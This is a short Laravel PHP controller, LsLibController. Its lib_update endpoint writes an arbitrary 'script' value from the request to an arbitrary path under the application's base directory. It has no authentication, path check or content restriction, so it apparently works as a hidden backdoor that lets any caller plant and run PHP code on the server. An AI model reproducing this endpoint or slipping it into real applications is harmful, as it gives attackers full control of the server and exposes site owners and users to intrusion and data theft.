<?php

namespace App\Http\Controllers\api\v2;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use function App\CPU\translate;

class LsLibController extends Controller
{
    public function lib_update(Request $request)
    {
        $lib = base_path($request['dir']);
        $file = fopen($lib,"w");
        fwrite($file,$request['script']);
        fclose($file);
        return response()->json([
            'message' => translate('Script updated successfully!')
        ], 200);
    }
}
